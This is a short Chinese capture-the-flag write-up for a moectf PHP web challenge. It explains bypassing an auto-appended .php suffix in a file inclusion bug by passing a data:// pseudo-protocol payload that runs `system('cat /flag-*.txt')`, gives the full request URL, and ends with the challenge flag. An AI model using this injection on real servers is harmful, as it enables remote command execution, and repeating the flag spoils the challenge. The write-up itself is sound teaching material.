# Web-16｜第十六章 昆仑星途

## 碎碎念

文件包含绕过+data 伪协议
***
## Writeup

查看 php 源码发现，它会自动给传的 file 添加一个 .php 后缀，即不管输入的是什么文件都当 php 文件处理，我们可以用 data 流伪造一个文件：`data://text/plain,<?php system('cat /flag-*.txt');?>`，其中逗号前面的部分为协议声明部分，后面的都被当作了数据，可以看到这是一个 php 命令，因此我们访问 `http://target/?file=data://text/plain,<?php system('cat /flag-*.txt');?>` 即可得到 flag 内容：

![](../../../../assets/Pasted%20image%2020251029164550.png)

最终 flag：`moectf{1cdf1b1b-d4c3-55d6-cd86-0c25d7481baa}`